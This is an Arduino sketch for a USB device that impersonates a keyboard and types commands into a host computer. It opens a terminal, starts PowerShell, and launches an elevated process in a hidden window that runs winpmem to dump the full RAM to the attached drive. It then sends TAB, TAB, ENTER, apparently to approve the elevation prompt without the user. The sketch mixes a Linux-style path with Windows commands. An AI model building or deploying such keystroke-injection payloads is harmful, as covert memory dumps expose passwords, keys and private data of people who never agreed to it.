#include <HIDKeyboard.h>
#include <string.h>

HIDKeyboard keyboard;

void setup() {
  keyboard.begin();
  delay(5000);

  openTerminal();

  keyboard.println("cd media/nimda/");

  keyboard.println("powershell");
  delay(1000);
  keyboard.println("$driveltr = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2} | Select-Object -ExpandProperty DeviceID");
  delay(1000);
  keyboard.println("Start-Process powershell.exe -Verb runAs -ArgumentList \"-NoExit\", \"-Command\", \"Set-Location -Path $driveltr ; .\\winpmem_mini_x64_rc2.exe ramdump.raw\" -WindowStyle Hidden");
  delay(5000);
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  keyboard.pressSpecialKey(TAB);
  keyboard.releaseKey();
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
}

void loop() {
  // put your main code here, to run repeatedly:
}

void openTerminal() {
  keyboard.pressSpecialKey(GUI);
  keyboard.releaseKey();
  delay(4000);
  keyboard.print("terminal");
  delay(5000);
  keyboard.pressSpecialKey(ENTER);
  keyboard.releaseKey();
  delay(5000);
}
